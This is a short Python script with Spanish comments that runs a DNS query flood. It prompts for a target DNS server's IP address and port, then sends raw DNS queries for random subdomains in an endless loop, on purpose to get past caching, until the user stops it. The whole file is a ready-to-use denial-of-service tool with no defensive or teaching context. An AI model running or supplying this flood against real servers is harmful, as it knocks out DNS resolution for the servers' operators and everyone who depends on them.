import socket
import random

def random_domain():
    # Genera nombres de dominio aleatorios para evitar caching
    return f"{random.randint(1000,9999)}.example.com"

def build_dns_query(domain):
    transaction_id = b'\x00\x01'
    flags = b'\x01\x00'
    questions = b'\x00\x01'
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    qname = b''.join(bytes([len(x)]) + x.encode() for x in domain.split('.')) + b'\x00'
    qtype = b'\x00\x01'
    qclass = b'\x00\x01'
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass

def main():
    target_ip = input("Ingresa la IP del servidor DNS objetivo: ").strip()
    target_port = int(input("Ingresa el puerto de destino: ").strip())

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        while True:
            domain = random_domain()
            dns_query = build_dns_query(domain)
            sock.sendto(dns_query, (target_ip, target_port))
            # Puedes añadir un pequeño delay si quieres limitar la velocidad
            # time.sleep(0.001)
    except KeyboardInterrupt:
        print("\nFlood detenido por el usuario.")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
